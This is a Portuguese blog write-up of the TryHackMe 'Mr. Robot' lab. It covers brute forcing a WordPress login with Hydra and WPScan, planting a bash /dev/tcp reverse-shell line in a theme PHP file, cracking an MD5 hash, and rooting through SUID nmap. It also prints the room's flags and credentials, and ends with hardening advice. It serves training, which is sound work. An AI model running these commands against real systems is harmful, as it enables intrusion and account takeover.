---
title: Mr. Robot - Desafio Hacker [TryHackMe]
description: 'Resolvendo máquina nível médio do TryHackMe inspirada na série Mr. Robot - WordPress exploitation, hash cracking e privilege escalation via SUID'
author: matheus
tags: ["tryhackme", "WriteUps", "WordPress", "privilege escalation", "SUID", "reverse shell"]
categories: ["SecLab", "WayOfSec", "Hacking", "Write Ups"]
pin: false
comments: true

---

# Writeup: Mr. Robot (TryHackMe)

### WordPress Exploitation, Brute Force, Reverse Shell e Privilege Escalation via SUID

Esta máquina é inspirada na série **Mr. Robot** e está disponível no TryHackMe. É uma excelente introdução a técnicas de enumeração web, exploração de WordPress, quebra de hashes e escalação de privilégios através de binários SUID.

**Link da sala:** [tryhackme.com/room/mrrobot](https://tryhackme.com/room/mrrobot)

## 1. Enumeração Inicial

### 1.1 Scan de portas

Começamos com um scan básico para identificar os serviços rodando na máquina:

```bash
sudo nmap -sS 10.10.70.104
```

Para um scan mais detalhado com versões dos serviços:

```bash
sudo nmap -sS -sV -p22,80,443 10.10.70.104
```

**Resultado da enumeração:**
Identificamos as seguintes portas abertas:

- **Porta 80 (HTTP)** - Apache HTTP Server
- **Porta 443 (HTTPS)** - Apache HTTP Server

A porta 22 (SSH) aparece como filtered/closed nesta máquina.

### 1.2 Enumeração de diretórios

Ao acessar o site pelo navegador, encontramos uma interface interativa inspirada na série. Agora precisamos descobrir o que mais existe no servidor.

**Por que enumerar diretórios?**
Servidores web frequentemente têm arquivos e pastas que não são linkados diretamente na página principal - painéis de administração, arquivos de backup, configurações expostas, etc.

Podemos usar diferentes ferramentas para isso:

```bash
# Usando Gobuster
gobuster dir -u http://10.10.70.104 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

# Usando Dirsearch
dirsearch -u http://10.10.70.104

# Usando Dirb
dirb http://10.10.70.104
```

**Descobertas importantes:**

```text
/wp-includes    → Diretório do WordPress
/wp-login       → Página de login do WordPress
/wp-admin       → Painel administrativo
/robots.txt     → Arquivo de configuração para crawlers
```

A presença de diretórios começando com `wp-` indica claramente que estamos lidando com um **WordPress**.

### 1.3 Análise do robots.txt

O arquivo `robots.txt` é usado para instruir bots de busca sobre quais páginas indexar. Frequentemente contém informações interessantes:

```bash
curl http://10.10.70.104/robots.txt
```

**Resultado:**

```text
User-agent: *
fsocity.dic
key-1-of-3.txt
```

**🚩 PRIMEIRA FLAG ENCONTRADA:**

Acessando `http://10.10.70.104/key-1-of-3.txt`:

```text
073403c8a58a1f80d943455fb30724b9
```

Também descobrimos um arquivo `fsocity.dic` - uma wordlist que será útil mais tarde!

### 1.4 Baixando e otimizando a wordlist

```bash
wget http://10.10.70.104/fsocity.dic
```

A wordlist contém muitas palavras duplicadas. Vamos otimizá-la:

```bash
cat fsocity.dic | sort | uniq > fsociety.dic
```

**Explicação:**
- `sort` - Ordena as linhas alfabeticamente
- `uniq` - Remove linhas duplicadas consecutivas (por isso o sort antes)
- `>` - Redireciona para um novo arquivo

Isso reduz drasticamente o tamanho da wordlist e o tempo de brute force.

## 2. Enumeração do WordPress

### 2.1 WPScan - Ferramenta especializada

Como identificamos um WordPress, podemos usar o **WPScan** para enumeração específica:

```bash
wpscan --url http://10.10.70.104
```

O WPScan identifica:
- Versão do WordPress
- Temas instalados
- Plugins (podem ter vulnerabilidades)
- Configurações de segurança

### 2.2 Identificando comportamento do login

Ao testar o login em `/wp-login.php` com credenciais aleatórias, notamos algo interessante:

- Login com usuário inválido: **"Invalid username"**
- Login com usuário válido mas senha errada: **"The password you entered for the username..."**

**Vulnerabilidade de enumeração de usuários!**
O WordPress está nos dizendo exatamente qual campo está errado. Isso permite fazer brute force primeiro no usuário, depois na senha.

## 3. Brute Force de Credenciais

### 3.1 Conceito do ataque

**Brute Force** é uma técnica que testa sistematicamente todas as combinações possíveis de credenciais. Com a wordlist que encontramos e a vulnerabilidade de enumeração, podemos:

1. Primeiro, descobrir um usuário válido
2. Depois, descobrir a senha desse usuário

### 3.2 Capturando a requisição de login

Usando um proxy como Burp Suite ou as ferramentas de desenvolvedor do navegador, interceptamos a requisição POST de login:

```text
POST /wp-login.php
Content-Type: application/x-www-form-urlencoded

log=admin&pwd=admin&...
```

O corpo relevante é: `log=^USER^&pwd=^PASS^`

### 3.3 Brute Force com Hydra - Descobrindo usuário

**Hydra** é uma ferramenta poderosa para brute force de diversos protocolos:

```bash
hydra -L fsociety.dic -p senha 10.10.70.104 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username" -t 30 -V
```

**Explicação dos parâmetros:**
- `-L fsociety.dic` - Wordlist de usuários (L maiúsculo = lista)
- `-p senha` - Senha fixa qualquer (p minúsculo = valor único)
- `10.10.70.104` - Alvo
- `http-post-form` - Tipo de ataque (formulário POST)
- `"/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username"` - Estrutura:
  - Página de login
  - Corpo da requisição com variáveis
  - Mensagem de erro para filtrar tentativas falhas
- `-t 30` - 30 threads paralelas
- `-V` - Modo verbose

**Resultado:** Usuário encontrado → `elliot`

Podemos confirmar testando no login - a mensagem de erro muda!

### 3.4 Brute Force da senha

Agora que temos o usuário, buscamos a senha:

```bash
hydra -l elliot -P fsociety.dic 10.10.70.104 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username" -t 30 -V
```

**Alternativa com WPScan** (geralmente mais rápido para WordPress):

```bash
wpscan --url http://10.10.70.104 --passwords fsociety.dic --usernames elliot
```

**Credenciais descobertas:**

```text
Login: elliot
Password: ER28-0652
```

## 4. Acesso ao WordPress e Reverse Shell

### 4.1 Acessando o painel administrativo

Com as credenciais, fazemos login em `/wp-login.php`. Somos o usuário **Elliot** com privilégios de administrador!

### 4.2 Conceito de Reverse Shell

**Reverse Shell** inverte a conexão típica - ao invés de conectarmos ao servidor, fazemos o servidor conectar de volta para nós. Isso é útil porque:

- Bypassa firewalls que bloqueiam conexões de entrada
- Funciona através de NAT
- Mais difícil de detectar

### 4.3 Preparando o listener

Na nossa máquina atacante, deixamos o netcat escutando:

```bash
nc -lvnp 53
```

**Por que porta 53?**
A porta 53 é usada para DNS e raramente é bloqueada por firewalls. Outras opções comuns: 443, 4444, 1234.

**Parâmetros do netcat:**
- `-l` - Modo listen (escuta)
- `-v` - Verbose
- `-n` - Não resolver DNS
- `-p 53` - Porta 53

### 4.4 Injetando código malicioso no WordPress

Existem várias formas de obter uma shell através do WordPress admin:

**Opção 1: Editar um tema**

1. Vá em `Appearance > Editor`
2. Selecione um arquivo PHP como `404.php` ou `archive.php`
3. Substitua o conteúdo pelo código da reverse shell
4. Acesse a página para executar

**Opção 2: Editar um plugin**

1. Vá em `Plugins > Editor`
2. Edite um plugin existente como "Hello Dolly"
3. Adicione o código malicioso
4. Ative o plugin

**Opção 3: Upload de plugin malicioso**

1. Crie um plugin com código PHP malicioso
2. Faça upload via `Plugins > Add New > Upload`
3. Ative o plugin

### 4.5 Código da Reverse Shell

Podemos usar a PHP reverse shell do Kali:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php .
```

Ou usar um one-liner no código do plugin/tema:

```php
exec("/bin/bash -c 'bash -i >& /dev/tcp/SEU_IP/53 0>&1'");
```

**Não esqueça de alterar:**
- `SEU_IP` - Seu IP na VPN do TryHackMe
- A porta deve corresponder ao listener

### 4.6 Executando a shell

Após editar o arquivo (por exemplo, `archive.php` do tema TwentyFifteen):

```bash
curl http://10.10.70.104/wp-content/themes/twentyfifteen/archive.php
```

**Resultado:** Conexão recebida no netcat!

```bash
$ whoami
daemon
```

## 5. Explorando o Sistema

### 5.1 Reconhecimento inicial

```bash
whoami      # daemon
hostname    # linux
ls /home    # robot
```

Existe um usuário `robot`. Vamos explorar:

```bash
cd /home/robot
ls -la
```

**Arquivos encontrados:**
- `key-2-of-3.txt` - Segunda flag (sem permissão de leitura)
- `password.raw-md5` - Hash MD5 da senha!

### 5.2 Analisando a hash

```bash
cat password.raw-md5
```

**Resultado:**

```text
robot:c3fcd3d76192e4007dfb496cca67e13b
```

Temos o usuário `robot` e uma hash MD5 da senha.

### 5.3 Identificando o tipo de hash

Podemos confirmar que é MD5 com:

```bash
hash-identifier
# Cole a hash quando solicitado
```

MD5 produz hashes de 32 caracteres hexadecimais - confere!

## 6. Quebrando a Hash MD5

### 6.1 Métodos de quebra

**MD5** é uma função de hash criptográfica (obsoleta para segurança). Para "quebrar", precisamos encontrar o texto original que gera aquela hash.

**Opção 1: John the Ripper**

```bash
# Salvar a hash em um arquivo
echo 'c3fcd3d76192e4007dfb496cca67e13b' > md5.hash

# Quebrar com wordlist
john md5.hash --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5
```

**Opção 2: Hashcat**

```bash
hashcat -m 0 'c3fcd3d76192e4007dfb496cca67e13b' /usr/share/wordlists/rockyou.txt --force
```

O `-m 0` indica modo MD5.

**Opção 3: Serviços online**

Sites como [CrackStation](https://crackstation.net/) ou [hashes.com](https://hashes.com/en/decrypt/hash) possuem enormes bancos de dados de hashes pré-computadas.

**Senha descoberta:**

```text
abcdefghijklmnopqrstuvwxyz
```

## 7. Escalando para Usuário Robot

### 7.1 O problema do terminal

Ao tentar trocar de usuário:

```bash
su robot
```

**Erro:** `su: must be run from a terminal`

Nossa reverse shell não tem um **PTY (Pseudo Terminal)** alocado, necessário para comandos interativos como `su`.

Através de pesquisa podemos achar a cola que nos ajuda nisso:

<img width="50%" alt="image" src="https://github.com/user-attachments/assets/33f7988a-a408-45c0-939d-7d8dbe427271" />

### 7.2 Upgrade da shell com Python

Verificamos se Python está disponível:

```bash
which python
whereis python
```

Spawning um PTY:

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

**Como funciona:**
A biblioteca `pty` em Python cria terminais pseudônicos - terminais virtuais que simulam um terminal real. O método `pty.spawn("/bin/bash")` inicia um bash com PTY alocado, permitindo interatividade completa.

### 7.3 Trocando para usuário robot

```bash
su robot
# Digite a senha: abcdefghijklmnopqrstuvwxyz
```

**🚩 SEGUNDA FLAG ENCONTRADA:**

```bash
cat key-2-of-3.txt
```

```text
822c73956184f694993bede3eb39f959
```

## 8. Privilege Escalation - Root

### 8.1 Conceito de SUID

**SUID (Set User ID)** é uma permissão especial em Linux que permite executar um arquivo com os privilégios do **dono** do arquivo, não do usuário que está executando.

Por exemplo, o comando `passwd` precisa modificar `/etc/shadow` (arquivo de senhas), mas usuários normais não têm essa permissão. O `passwd` tem SUID setado com dono root, então executa com privilégios de root.

**O perigo:** Se um binário com SUID tiver funcionalidades que permitem executar comandos ou ler arquivos, podemos abusar disso para escalar privilégios.

### 8.2 Buscando binários SUID

```bash
find / -perm -4000 2>/dev/null
```

**Explicação:**
- `find /` - Busca a partir da raiz
- `-perm -4000` - Arquivos com bit SUID (4000) setado
- `2>/dev/null` - Redireciona erros para null (limpa a saída)

Para filtrar apenas binários:

```bash
find / -perm +6000 2>/dev/null | grep '/bin/'
```

### 8.3 Binário vulnerável encontrado: nmap

Entre os resultados, encontramos:

```text
/usr/local/bin/nmap
```

O **nmap** com SUID? Isso é perigoso! Versões antigas do nmap (como a 3.81 presente nesta máquina) possuem um modo **interativo** que permite executar comandos shell.

### 8.4 Explorando o nmap interativo

```bash
/usr/local/bin/nmap --interactive
```

Entramos no modo interativo do nmap:

```text
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h for help
nmap>
```

Verificando os comandos disponíveis:

```bash
nmap> h #for help
```

O comando `!` permite executar comandos shell. Como o nmap está rodando com SUID root, os comandos executam como root!

### 8.5 Obtendo shell root

```bash
nmap> !sh
# whoami
root
```

**Conseguimos root!** 🎉

### 8.6 Capturando a flag final

```bash
cd /root
ls -la
cat key-3-of-3.txt
```
<img width="95%" alt="image" src="https://github.com/user-attachments/assets/d893332c-4669-4c0a-8e41-b5343fc2358f" />

**🚩 TERCEIRA FLAG ENCONTRADA:**

```text
04787ddef27c3dee1ee161b21670b4e4
```

## 9. Resumo da Exploração

### 9.1 Cadeia de ataque completa

```text
1. Enumeração
   └─> Descoberta do WordPress + robots.txt com wordlist e flag

2. Brute Force
   └─> Credenciais do WordPress (elliot::ER28-0652)

3. Initial Access
   └─> Reverse shell via edição de tema/plugin PHP

4. Lateral Movement
   └─> Hash MD5 → senha do usuário robot

5. Privilege Escalation
   └─> nmap SUID → shell interativo → root
```

### 9.2 Vulnerabilidades exploradas

| Vulnerabilidade | Impacto | Correção |
|-----------------|---------|----------|
| Enumeração de usuários WordPress | Permite brute force direcionado | Plugins de segurança, mensagens genéricas |
| Credenciais fracas | Acesso administrativo | Senhas fortes, 2FA |
| Tema/Plugin editável | RCE via código PHP | Desabilitar edição de arquivos |
| Hash MD5 exposta | Credenciais de outro usuário | Não armazenar hashes acessíveis |
| nmap com SUID | Escalação para root | Remover SUID de binários desnecessários |

### 9.3 Lições de segurança

**Para administradores:**

1. **WordPress hardening:**
   - Desabilitar edição de arquivos: `define('DISALLOW_FILE_EDIT', true);`
   - Limitar tentativas de login
   - Usar plugins de segurança

2. **Permissões de arquivo:**
   - Nunca expor hashes de senha
   - Revisar periodicamente binários SUID: `find / -perm -4000`

3. **Princípio do menor privilégio:**
   - Remover SUID de binários que não precisam
   - Usuários com permissões mínimas necessárias

---

**Flags capturadas:**

1. `073403c8a58a1f80d943455fb30724b9` (via robots.txt)
2. `822c73956184f694993bede3eb39f959` (via /home/robot)
3. `04787ddef27c3dee1ee161b21670b4e4` (via /root)

**Técnicas utilizadas:**

- Web Enumeration / Directory Bruteforce
- WordPress Exploitation / User Enumeration
- Brute Force Authentication (Hydra/WPScan)
- PHP Reverse Shell / Webshell Upload
- Hash Cracking (MD5)
- PTY Shell Upgrade
- SUID Binary Exploitation / Privilege Escalation

### Referências

- [TryHackMe - Mr. Robot](https://tryhackme.com/room/mrrobot)
- [GTFOBins - nmap](https://gtfobins.github.io/gtfobins/nmap/)
- [HackTricks - WordPress](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress)
- [PentestMonkey - PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell)
- [CrackStation](https://crackstation.net/)

---

**Nota:** Esta é uma máquina excelente para iniciar com praticas de enumeração web, exploração de CMS e técnicas básicas de privilege escalation (escalação de privilégios). Para finalizar, deixaremos claro que a série 'Mr. Robot' é realmente altamente recomendada para quem gosta de hacking! :D

---
